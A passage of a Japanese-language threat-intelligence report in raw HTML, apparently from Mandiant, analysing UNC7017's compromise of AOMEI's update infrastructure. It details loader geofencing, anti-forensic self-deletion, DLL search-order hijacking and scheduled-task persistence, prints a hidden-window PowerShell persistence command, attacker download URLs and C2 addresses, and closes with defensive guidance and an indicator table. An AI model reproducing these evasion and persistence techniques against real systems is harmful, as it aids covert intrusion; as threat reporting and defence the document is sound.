エージェント（</span><code style=\"vertical-align: baseline;\">Anyviewer-loader/1.0</code><span style=\"vertical-align: baseline;\">、</span><code style=\"vertical-align: baseline;\">Anyviewer-ipcheck/1.0</code><span style=\"vertical-align: baseline;\">）を使用して、外部ドメイン ネーム システム（DNS）（</span><code style=\"vertical-align: baseline;\">myip.opendns.com</code><span style=\"vertical-align: baseline;\">、</span><code style=\"vertical-align: baseline;\">o-o.myaddr.l.google.com</code><span style=\"vertical-align: baseline;\">）と HTTP リフレクション サービス（</span><code style=\"vertical-align: baseline;\">checkip.amazonaws.com</code><span style=\"vertical-align: baseline;\">、</span><code style=\"vertical-align: baseline;\">api.ipify.org</code><span style=\"vertical-align: baseline;\">、</span><code style=\"vertical-align: baseline;\">ifconfig.me/ip</code><span style=\"vertical-align: baseline;\">、</span><code style=\"vertical-align: baseline;\">icanhazip.com</code><span style=\"vertical-align: baseline;\">）にクエリを実行します。特定の実行ブランチでは、返された国コードが</span><code style=\"vertical-align: baseline;\">「CN」</code><span style=\"vertical-align: baseline;\">（中国）の場合、ローダはプライマリ ペイロードの実行パスを中止します。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">ミューテックスのロック:</strong><span style=\"vertical-align: baseline;\"> 名前付きミューテックス </span><code style=\"vertical-align: baseline;\">Global\\{F9E6E3C0-E11A-4F85-9944-AF4AD6E05883}</code><span style=\"vertical-align: baseline;\"> を取得して、同じホスト上で複数のインスタンスが同時に実行されるのを防ぎます。</span></p>\n</li>\n</ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">ホスト アーティファクトの復元とアンチ フォレンジック: </strong><span style=\"vertical-align: baseline;\">インシデント後のトリアージとフォレンジックによる再構築を困難にするため、ローダは実行サイクル中にローカル構成の状態を体系的に元に戻します。マルウェアは </span><code style=\"vertical-align: baseline;\">down_html.ini</code><span style=\"vertical-align: baseline;\">（</span><code style=\"vertical-align: baseline;\">&lt;install_dir&gt;\\..\\..\\</code><span style=\"vertical-align: baseline;\"> にあります）を解析し、アップデート スレッド パラメータ（</span><code style=\"vertical-align: baseline;\">thrid</code><span style=\"vertical-align: baseline;\">）をデフォルト値の 5 に戻し、アップデート ダウンロード URL を正規の AOMEI 配信インフラストラクチャ（</span><code style=\"vertical-align: baseline;\">https://www2.aomeisoftware.com/download/abpopup/</code><span style=\"vertical-align: baseline;\">）に戻します。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">ステージ 3 ペイロードのステージングと解凍: 環境チェックをクリアすると、CROSSROAD は https://promotion.storage-data.com/config/component.zip（en.zip としても確認されています）を %TEMP%\\svc&lt;random_hex&gt;.tmp にダウンロードし、組み込まれた miniz ライブラリを使用してその内容をユーザーのローカル アプリケーション データ ディレクトリに解凍します。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">タスク スケジューラによる永続化:</strong><span style=\"vertical-align: baseline;\"> ステージングされたペイロード バンドルの継続的な実行を確実にするため、</span><code style=\"vertical-align: baseline;\">upgrade-now.exe</code><span style=\"vertical-align: baseline;\"> は </span><code style=\"vertical-align: baseline;\">RadminComponentRuntime</code><span style=\"vertical-align: baseline;\"> という名前のスケジュールされたタスクを登録して永続化を図ります（説明は「Radmin Component runtime checkable.」に設定されています）。このタスクは、3 時間ごとに </span><code style=\"vertical-align: baseline;\">%LOCALAPPDATA%\\Radmin\\FamItrfc.exe --runtimechk</code><span style=\"vertical-align: baseline;\"> を実行するように設定されています。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">自己削除（--nitrod）:</strong><span style=\"vertical-align: baseline;\"> ペイロード バンドルを解凍してスケジュールされたタスクを作成した後、CROSSROAD は自身をディスクから消去します。Windows のファイルロック制約を回避するために、実行可能ファイルは自身のコピーを一時ディレクトリにドロップし、</span><code style=\"vertical-align: baseline;\">--nitrod</code><span style=\"vertical-align: baseline;\"> パラメータを使用して実行します。その際、親プロセスの PID を </span><code style=\"vertical-align: baseline;\">NITRODP</code><span style=\"vertical-align: baseline;\"> 経由で、元の実行可能ファイルパスを </span><code style=\"vertical-align: baseline;\">NITRODT</code><span style=\"vertical-align: baseline;\"> 経由で渡します。子プロセスは親プロセスが終了するのを待ち、</span><code style=\"vertical-align: baseline;\">SetFileInformationByHandle</code><span style=\"vertical-align: baseline;\"> を介して元のバイナリのプライマリ </span><code style=\"vertical-align: baseline;\">:$DATA</code><span style=\"vertical-align: baseline;\"> ストリームの名前を </span><code style=\"vertical-align: baseline;\">:wtfbbq</code><span style=\"vertical-align: baseline;\"> という代替データ ストリームに変更し、</span><code style=\"vertical-align: baseline;\">FileDispositionInfo</code><span style=\"vertical-align: baseline;\"> に </span><code style=\"vertical-align: baseline;\">DeleteFile = TRUE</code><span style=\"vertical-align: baseline;\"> のフラグを立てて、ハンドルが閉じられたときにバイナリのリンクを解除します。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">バージョン情報:</strong><span style=\"vertical-align: baseline;\"> 実行可能ファイルには、標準的な PE バージョン メタデータが含まれており、</span><code style=\"vertical-align: baseline;\">「ProductName: AOMEI Update Compent」</code><span style=\"vertical-align: baseline;\">という注目すべき誤字文字列が見られました。</span></p>\n</li>\n</ul></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Victim Profiling, Malware Delivery Logic\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/Figure_5_Victim_Profiling_Malware_Delivery.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>図 5: 被害者のプロファイリングとマルウェア配信ロジック</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><strong style=\"font-style: italic; vertical-align: baseline;\">ステージ 3 ペイロード: SHINYROAD と Radmin Suite</strong></p>\n<p><span style=\"vertical-align: baseline;\">CROSSROAD によって </span><code style=\"vertical-align: baseline;\">%LOCALAPPDATA%\\Radmin\\</code><span style=\"vertical-align: baseline;\"> に解凍されたペイロード アーカイブには、</span><strong style=\"vertical-align: baseline;\">SHINYROAD</strong><span style=\"vertical-align: baseline;\"> モジュール型バックドア フレームワークの配信に使用される Famatech Radmin 3.x 管理バンドルが含まれています。このマルウェア自体には独自の永続化メカニズムは組み込まれておらず、実行は CROSSROAD によって登録された外部のスケジュールされたタスクに全面的に依存しています。</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">DLL 検索順序のハイジャック（BlkScrDl.dll）による実行:</strong><span style=\"vertical-align: baseline;\"> 永続化された </span><code style=\"vertical-align: baseline;\">RadminComponentRuntime</code><span style=\"vertical-align: baseline;\"> スケジュール タスクが、正規の署名付き Radmin バイナリ </span><code style=\"vertical-align: baseline;\">%LOCALAPPDATA%\\Radmin\\FamItrfc.exe --runtimechk</code><span style=\"vertical-align: baseline;\">（または </span><code style=\"vertical-align: baseline;\">FamItrf2.exe</code><span style=\"vertical-align: baseline;\">）を起動すると、実行が開始されます。起動時、Radmin 実行可能ファイルは検索順序ハイジャックによって、攻撃者の署名されていない DLL である </span><code style=\"vertical-align: baseline;\">BlkScrDl.dll</code><span style=\"vertical-align: baseline;\"> を読み込むよう悪用されます。攻撃者は、この DLL に Radmin の正規の「空白画面」ドライバ ライブラリを装った名前を付けました。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">共有メモリとインプロセス COM サーバーのステージング:</strong><span style=\"vertical-align: baseline;\"> </span><code style=\"vertical-align: baseline;\">BlkScrDl.dll</code><span style=\"vertical-align: baseline;\"> は、実行時に実行ディレクトリ内の </span><code style=\"vertical-align: baseline;\">config.zip</code><span style=\"vertical-align: baseline;\"> を見つけ、その生のデータを </span><code style=\"vertical-align: baseline;\">Local\\963d3c60-d406-4ad6-aa1e-dc8e45061ccf</code><span style=\"vertical-align: baseline;\"> という名前の共有メモリ セクションにマッピングし、</span><code style=\"vertical-align: baseline;\">csvc\\RuntimeComponent.dll</code><span style=\"vertical-align: baseline;\"> を CLSID </span><code style=\"vertical-align: baseline;\">{21191641-0D7F-4CD9-9572-01AAE6E7851B}</code><span style=\"vertical-align: baseline;\"> と AppID </span><code style=\"vertical-align: baseline;\">{9AD3E98A-4C7E-4F37-982D-D73D41E4F91B}</code><span style=\"vertical-align: baseline;\"> のもとにインプロセス COM サーバーとして動的に登録します。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">COM トリガーによるステージ 2 の初期化と埋め込み PocketPy VM:</strong><span style=\"vertical-align: baseline;\"> Radmin プロセスが登録済みの CLSID をインスタンス化すると、Windows COM サブシステムが DLL を読み込みます。DLL は共有メモリから </span><code style=\"vertical-align: baseline;\">config.zip</code><span style=\"vertical-align: baseline;\"> を直接読み取り、暗号化されたペイロード </span><code style=\"vertical-align: baseline;\">metadata.dat</code><span style=\"vertical-align: baseline;\"> を解凍して、HMAC-SHA256 派生鍵と IV を使用して ChaCha20 で復号します。復号されたペイロードは、コンパイルされた Python バイトコードで構成されており、</span><code style=\"vertical-align: baseline;\">RuntimeComponent.dll</code><span style=\"vertical-align: baseline;\"> が組み込まれた PocketPy インタプリター内でこれを実行して、</span><code style=\"vertical-align: baseline;\">8.218.65.184:443</code><span style=\"vertical-align: baseline;\"> への初期 C2 接続を確立します。</span></p>\n</li>\n</ul>\n<p><strong style=\"vertical-align: baseline;\">SHINYROAD アーキテクチャの進化</strong></p>\n<p><span style=\"vertical-align: baseline;\">以前のキャンペーン バリアントの分析により、SHINYROAD はカスタム C レベル拡張機能（_pyio_compat、_pyio_struct、pkpy）を利用して、標準の Python ライブラリをディスクに読み込まないようにしていることが判明しました。</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">カスタム バイナリ C2 プロトコル</strong><span style=\"vertical-align: baseline;\">: 以前のバリアントは、生の TCP（</span><code style=\"vertical-align: baseline;\">8.218.65.184:41397</code><span style=\"vertical-align: baseline;\">）を介して通信していました。エージェントは、ホスト名とユーザー名のフィンガープリントを作成して一意の ID を生成し、ハードコードされたハンドシェイク キーを介して認証を行い、以降のすべての通信を、この一意の ID から派生した対称鍵暗号を使用する方式へ動的に移行します。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">インメモリ機能</strong><span style=\"vertical-align: baseline;\">: このエンジンは、インタラクティブなリモートシェル アクセス（os.system）、トラフィック チャフ（ネットワーク シグネチャを妨害するためにランダム化されたジャンク パケットを生成）、</span><code style=\"vertical-align: baseline;\">pkpy</code><span style=\"vertical-align: baseline;\"> WorkPool スレッド マネージャーを介した動的なインメモリ拡張をサポートしており、スクリプト モジュールをディスクに書き込むことなく実行できます。</span></p>\n</li>\n</ul>\n<p><strong style=\"font-style: italic; vertical-align: baseline;\">侵入後の活動: Nitro PDF テーマと Adaptix C2</strong></p>\n<p><span style=\"vertical-align: baseline;\">2026 年 7 月中旬、SHINYROAD のデプロイ成功後、UNC7017 が侵入後活動用フレームワークである Adaptix C2 のクライアントコンポーネント「ADAPTAGENT」を送り込む配信するという、後続フェーズの活動がテレメトリーによって特定されました。ユーザーが自らダウンロードしたアクティビティに見せかけて紛れ込むため、これらのペイロードは Nitro PDF のプロモーション ツールやスキャンツール（</span><code style=\"vertical-align: baseline;\">NitroPromotion.exe</code><span style=\"vertical-align: baseline;\">）に偽装していました。</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">永続化:</strong><span style=\"vertical-align: baseline;\"> マルウェアは、</span><code style=\"vertical-align: baseline;\">\\NitroRuntime</code><span style=\"vertical-align: baseline;\"> という名前のスケジュールされたタスクを登録し、以下を実行しました。</span></p>\n</li>\n</ul></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-markup\"><code>powershell -Command \"Start-Process 'C:\\Users\\&lt;USER&gt;\\AppData\\Local\\Temp\\NitroPromotion.exe' -WindowStyle Hidden\"</code></pre>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\"><span style=\"font-style: italic; vertical-align: baseline;\">図 6: NitroRuntime タスク スケジューラによる永続化</span></span></p></div>\n<div class=\"block-paragraph_advanced\"><ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Adaptix C2 ビーコン送信</strong><span style=\"vertical-align: baseline;\">: 実行可能ファイルは、</span><code style=\"vertical-align: baseline;\">%LOCALAPPDATA%\\Nitro Pro\\</code><span style=\"vertical-align: baseline;\"> から </span><code style=\"vertical-align: baseline;\">Eztwain4.dll</code><span style=\"vertical-align: baseline;\">（ADAPTAGENT）をサイドローディングし、</span><code style=\"vertical-align: baseline;\">8.210.84.56:6800</code><span style=\"vertical-align: baseline;\"> への 2 分間隔の定期的なビーコンを確立しました。</span></p>\n</li>\n</ul>\n<h4><strong style=\"vertical-align: baseline;\">見通しと影響</strong></h4>\n<p><span style=\"vertical-align: baseline;\">このキャンペーンは、ソフトウェア サプライ チェーン攻撃の手法がより広範に進化していることを示しています。サプライ チェーンへの侵入は、歴史的にソフトウェアのソースコードにバックドアを挿入したり、デベロッパーのビルド パイプラインを改ざんしたりすることに重点が置かれてきました（例:</span><a href=\"https://cloud.google.com/blog/topics/threat-intelligence/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor\"><span style=\"vertical-align: baseline;\"> </span><span style=\"text-decoration: underline; vertical-align: baseline;\">SolarWinds</span></a><span style=\"vertical-align: baseline;\">、</span><a href=\"https://cloud.google.com/blog/topics/threat-intelligence/3cx-software-supply-chain-compromise\"><span style=\"text-decoration: underline; vertical-align: baseline;\">3CX</span></a><span style=\"vertical-align: baseline;\">）。ソースツリーの侵害は大きな影響を及ぼしますが、公式リリース ファイルに永続的なバイナリ シグネチャが残るため、リリース後のバイナリ分析で発見される可能性があります。</span></p>\n<p><span style=\"vertical-align: baseline;\">UNC7017 が一時的な構成改ざんを採用している手法は、オーバーヘッドが少なく、よりステルス性の高い代替手段と言えます。</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">設計段階からの解析回避:</strong><span style=\"vertical-align: baseline;\"> 構成変更の発生を 5～10 分間の時間枠に限定することで、大半の正規ユーザーや自動化されたリポジトリ クローラーは、ベンダーの署名がある正規ファイルのみにしか接しない（検出できない）ようになっています。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">選択的な悪用</strong><span style=\"vertical-align: baseline;\">: 脅威アクターは、ベンダーのインフラストラクチャでの露出時間枠を最小限に抑えながら、頻繁にポーリングを行う標的組織を選択的に侵害できます。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">二面的なアプローチ</strong><span style=\"vertical-align: baseline;\">: ソフトウェア アップデートのリダイレクトと、不可視の WebDAV NTLM 認証強制を組み合わせることで、バイナリ ペイロードの実行がブロックされた場合でも、攻撃者は受動的なユーザーから認証情報を収集できるようになります。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">商用ソフトウェアの流用</strong><span style=\"vertical-align: baseline;\">: サイドローディングされた隠密チャネルをカモフラージュするために、正規の管理ツール（Radmin 3.x など）の未改変バージョンをデプロイする手法は、攻撃者が商用のリモート管理機能を隠されたバックドア モジュールとどのように組み合わせているかを示しています。</span></p>\n</li>\n</ol>\n<h4><strong style=\"vertical-align: baseline;\">修復とセキュリティ強化</strong></h4>\n<p><span style=\"vertical-align: baseline;\">防御側は、アップデータ プロセスの動作プロファイリングに重点を置き、特にバックグラウンドのアップデート実行プロセスによって生成された署名のない子プロセスや、信頼できるデスクトップ ソフトウェアから発生する不正なネットワーク リダイレクトをモニタリングする必要があります。ソフトウェア デリバリー パイプラインのセキュリティ保護に関するより広範な推奨事項については、以前に公開された</span><a href=\"https://cloud.google.com/blog/topics/threat-intelligence/mitigation-guidance-for-supply-chain-compromise\"><span style=\"text-decoration: underline; vertical-align: baseline;\">サプライ チェーン侵害の軽減策ガイダンス</span></a><span style=\"vertical-align: baseline;\">をご覧ください。</span></p>\n<p><strong style=\"vertical-align: baseline;\">ベンダーへの通知とアーキテクチャのセキュリティ強化</strong></p>\n<p><span style=\"vertical-align: baseline;\">2026 年 7 月 17 日、Mandiant は AOMEI Technology に対し、同社のアップデート インフラストラクチャで構成の改ざんが確認されたことを通知し、関連するインジケーターを提供しました。その後、AOMEI は 2026 年 7 月 29 日に、是正措置を講じたと回答しました。</span></p>\n<p><span style=\"vertical-align: baseline;\">サーバーサイドの修復ではエンドポイントを駆除できない理由</span></p>\n<p><span style=\"vertical-align: baseline;\">重要な点として、サーバーサイドの修復だけでは、以前の改ざん期間中に悪意のあるアップデートをダウンロードしたエンドポイントはクリーンアップされません。改ざんはごく短時間で行われたため、プロアクティブなエンドポイント ハンティングと修復が行われない限り、これらのファイルを受信したシステムは、組織が把握しないまま侵害された状態が続く可能性があります。</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">永続的な常駐ペイロード</strong><span style=\"vertical-align: baseline;\">: 改ざんが有効な期間中に更新をポーリングしたエンドポイントは、スケジュールされたタスクを介して永続的なペイロードをダウンロードし、ステージングしました。このペイロードは、ベンダーが配信元サーバーで正規の .ini ファイルを復元した後も完全に動作し続けます。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">根本原因の隠蔽</strong><span style=\"vertical-align: baseline;\">: その後のバックドア アクティビティとスケジュールされたタスクは、検出可能なエンドポイント テレメトリーを生成しますが、一時的な配信ベクトルにより、初期の侵入メカニズムが隠蔽されます。サーバーの改ざんは約 5 分間続き、ローダーはローカル構成ファイルを能動的に元に戻すため、数時間後にベンダーの更新 URL を確認した調査員は、無害で正規のインフラストラクチャしか確認できず、根本原因の分析と最初の感染者の特定が困難になります。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">ハンティングの必要性</strong><span style=\"vertical-align: baseline;\">: AOMEI ソフトウェアを実行している組織は、ベンダーがサーバーサイドで是正措置を講じたからといって、それだけで保護されていると考えることはできません。企業のセキュリティ チームは、本投稿で提供されているインジケーターと YARA ルールを活用して、4 月から 7 月までの期間全体にわたってエンドポイントとネットワークの遡及的な脅威ハンティングを行う必要があります。</span></p>\n</li>\n</ul>\n<p><strong style=\"vertical-align: baseline;\">ソフトウェア ベンダーとデベロッパー向けのガイダンス</strong></p>\n<p><span style=\"vertical-align: baseline;\">ソフトウェア サプライ チェーンのセキュリティは、デベロッパーのワークステーションやビルド パイプラインにとどまりません。デスクトップ ソフトウェアがリモート構成ファイルに依存して更新と通知の動作を管理している場合、攻撃者はソースコードではなく配信レイヤを標的とする可能性があります。構成の改ざんや配信チャネルのハイジャックを防ぐために、ソフトウェア ベンダーは次のセキュリティ対策を実装する必要があります。</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">エンドツーエンドの暗号署名検証</strong><span style=\"vertical-align: baseline;\">: クライアント アプリケーションは、ダウンロードしたすべての実行可能ファイルとアーカイブの Authenticode デジタル署名を暗号学的に検証し、ベンダー証明書の有効性を確認してから、解凍または実行する必要があります。アップデート クライアントは、トランスポート層の HTTPS やリモート チェックサム（認証されていない構成ファイル内のクリアテキスト MD5 値など）のみに依存してはなりません。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">暗号署名された構成ファイル</strong><span style=\"vertical-align: baseline;\">: リモート構成ファイル（.ini、.json、.xml）は、非対称公開鍵暗号を使用してデジタル署名する必要があります。配信元サーバーまたはコンテンツ配信ネットワーク（CDN）が不正に改ざんされた場合、クライアント ソフトウェアは無効な署名を検出し、構成を拒否します。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">ドメインの許可リスト登録と宛先ピニング</strong><span style=\"vertical-align: baseline;\">: ソフトウェア アップデート クライアントは、宛先ピニングを厳格に適用し、アップデートのダウンロードを、事前に承認されたベンダーの公式ドメインと CDN に限定する必要があります。アップデート エンジンは、任意のサードパーティ ドメインや汎用パブリック クラウド ストレージ バケットへのリダイレクトを拒否する必要があります。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">アプリ内ハンドラでの Uniform Resource Identifier（URI）スキームの制限</strong><span style=\"vertical-align: baseline;\">: 埋め込みウェブビュー、プロモーション ポップアップ、通知ハンドラは、安全なウェブ プロトコル（</span><code style=\"vertical-align: baseline;\">https://</code><span style=\"vertical-align: baseline;\">）を厳格に適用し、ローカル ファイル（</span><code style=\"vertical-align: baseline;\">file://</code><span style=\"vertical-align: baseline;\">）と UNC WebDAV スキームを明示的に禁止して、外部への NTLM 認証情報の強制を防止する必要があります。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">コア アップデートとマーケティング チャネルの分離</strong><span style=\"vertical-align: baseline;\">: 重要なソフトウェア メンテナンス ルーティンを動的なプロモーション ポップアップや通知バナーから分離することで、攻撃対象領域を縮小し、広告チャネルがローカル コード実行をトリガーできないようにします。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">配信元の整合性モニタリングとアクセス制御</strong><span style=\"vertical-align: baseline;\">: 更新メタデータをホストするオリジン ウェブサーバーとオブジェクト ストレージ バケットでは、厳格なアクセス制御、多要素認証、自動化されたリアルタイムのファイル整合性モニタリング（FIM）を適用し、構成変更時に即座にアラートを送信する必要があります。</span></p>\n</li>\n</ul>\n<p><strong style=\"vertical-align: baseline;\">セキュリティ運用（SOC）とインシデント対応担当者向けのガイダンス</strong></p>\n<p><span style=\"font-style: italic; vertical-align: baseline;\">「特定の時点」でのトリアージにおける落とし穴の克服</span></p>\n<p><span style=\"vertical-align: baseline;\">この攻撃はごく短時間で行われる性質を持つため、インシデント対応に特有の課題が生じます。</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">トリアージの罠</strong><span style=\"vertical-align: baseline;\">: アップデータによって生成された不審なプロセスに対して EDR アラートがトリガーされると、SOC アナリストはベンダーのダウンロード URL にアクセスしたり、URL のレピュテーションを確認したりして、アラートを検証しようとすることがよくあります。脅威アクターは 5～10 分以内にリモート構成ファイルを元に戻すため、ベンダーのサーバーはほとんどの場合、正規のクリーンなファイルを返します。そのため、アナリストはアラートを誤検知と誤認して取り下げてしまいます。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">実用的な IR プロトコル</strong><span style=\"vertical-align: baseline;\">: 防御側は、ライブウェブ チェックに依存してはなりません。インシデント対応担当者は、エンドポイントの </span><code style=\"vertical-align: baseline;\">%PROGRAMFILES(X86)%\\AOMEI\\*\\Tmphtml\\</code><span style=\"vertical-align: baseline;\"> にキャッシュ保存された構成ファイルを保全および分析し、アラートがトリガーされた正確な秒に対応するプロキシ / ファイアウォールのテレメトリーを確認する必要があります。</span></p>\n</li>\n</ul>\n<p><strong style=\"font-style: italic; vertical-align: baseline;\">後続の 攻撃活動の偽装</strong></p>\n<p><span style=\"vertical-align: baseline;\">Nitro PDF を装った Adaptix C2 のデプロイにより、アナリストはアラートを段階的なラテラル ムーブメントではなく、ユーザーが開始した単発のソフトウェア ダウンロードとして処理してしまう可能性があります。インシデント対応者は、アップデータ プロセスの親プロセスを追跡して、サプライ チェーン改ざんの根本原因を特定する必要があります。</span></p>\n<p><span style=\"vertical-align: baseline;\">エンドポイントとネットワークのセキュリティ強化アクション</span></p>\n<p><span style=\"font-style: italic; vertical-align: baseline;\">エンドポイント ファイルのチェック</span></p>\n<p><span style=\"vertical-align: baseline;\">システム内で以下のディレクトリおよびアーティファクトを点検してください。防御側は、悪意のあるペイロードと、検索順序ハイジャックに悪用される正規の署名付きバイナリを区別する必要があります。</span></p>\n<div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">ディレクトリ</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">悪意のあるアーティファクト（プライマリ IOC）</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">悪用された正規 / サポート バイナリ</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">防御側のトリアージとハンティングのガイダンス</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: bottom; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">%LOCALAPPDATA%\\Radmin\\</strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">BlkScrDl.dll、csvc\\RuntimeComponent.dll、config.zip、metadata.dat</code></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">FamItrfc.exe、FamItrf2.exe、WinLpcDl.dll、WinLpcDl2.dll</code></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">実行可能ファイルが署名されている場合でも、却下しないでください。</span><code style=\"vertical-align: baseline;\">FamItrfc.exe</code><span style=\"vertical-align: baseline;\"> は、</span><code style=\"vertical-align: baseline;\">BlkScrDl.dll</code><span style=\"vertical-align: baseline;\"> のハイジャックに悪用された正規の Famatech ソフトウェアです。署名されていない DLL や </span><code style=\"vertical-align: baseline;\">--runtimechk</code><span style=\"vertical-align: baseline;\"> を指定した実行に対してアラートを設定してください。</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">%LOCALAPPDATA%\\Nitro Pro\\</strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">Eztwain4.dll（ADAPTAGENT）、NitroPromotion.exe</code></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">mfc140u.dll</code><span style=\"vertical-align: baseline;\">（Microsoft MFC ランタイム）、</span><code style=\"vertical-align: baseline;\">Nitro_Scan2PDFApp.exe</code></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">ペイロードは Nitro PDF ツールを装います。</span><code style=\"vertical-align: baseline;\">Eztwain4.dll </code><span style=\"vertical-align: baseline;\">は、実行可能ファイルによってサイドローディングされます。</span><code style=\"vertical-align: baseline;\">-WindowStyle Hidden</code><span style=\"vertical-align: baseline;\"> で生成された親 PowerShell プロセスを探します。</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">%TEMP%\\</strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">svc*.tmp, en\\</code></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">—</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">NTFS ストリームの上書き（</span><code style=\"vertical-align: baseline;\">:wtfbbq</code><span style=\"vertical-align: baseline;\">）経由で CROSSROAD をパージするため、</span><code style=\"vertical-align: baseline;\">--nitrod</code><span style=\"vertical-align: baseline;\"> 付きで生成された一時的な子プロセス。</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">AOMEI のインストール パス（</span><code style=\"vertical-align: baseline;\">Tmphtml\\、html\\</code><span style=\"vertical-align: baseline;\">）</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">upgrade-now.zip、upgrade-now.exe</code><span style=\"vertical-align: baseline;\">（CROSSROAD）</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">down_html.ini、Notifycfg.ini</code></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">AOMEI アップデート フローのステージング ロケーション。ウェブ UI の </span><code style=\"vertical-align: 